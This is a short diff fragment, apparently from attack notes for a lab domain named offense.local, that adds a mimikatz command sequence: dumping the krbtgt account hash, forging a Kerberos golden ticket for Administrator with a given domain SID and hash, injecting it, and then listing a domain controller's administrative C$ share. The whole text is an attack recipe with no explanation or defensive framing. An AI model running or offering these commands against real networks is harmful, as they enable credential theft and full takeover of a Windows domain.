@@ -1,1 +1,6 @@
 
+mimikatz.exe
+mimikatz # lsadump::lsa /inject /name:krbtgt
+mimikatz # kerberos::golden /user:Administrator /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /krbtgt:8584cfccd24f6a7f49ee56355d41bd30 /id:500 /ptt
+
+C:\Administrator.AFCR-DC\Downloads>dir \\10.0.0.25\C$
